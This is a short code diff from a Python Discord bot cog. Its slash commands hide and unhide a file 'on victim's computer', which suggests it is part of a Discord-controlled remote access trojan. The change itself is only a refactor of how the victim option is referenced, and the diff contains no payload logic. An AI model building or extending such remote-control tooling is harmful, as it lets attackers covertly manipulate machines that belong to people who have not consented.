@@ -13,7 +13,7 @@ class Hide(commands.Cog):
     @commands.slash_command(
         description="Hide file on victim's computer",
         options=[
-            self.bot.victim,
+            bot.victim,
             discord.Option("file", description="File path of the file to be hidden", required=True),
         ],
     )
@@ -43,7 +43,7 @@ class Hide(commands.Cog):
     @commands.slash_command(
         description="Unhide file on victim's computer",
         options=[
-            self.bot.victim,
+            bot.victim,
             discord.Option("file", description="File path of the file to be unhidden", required=True),
         ],
     )
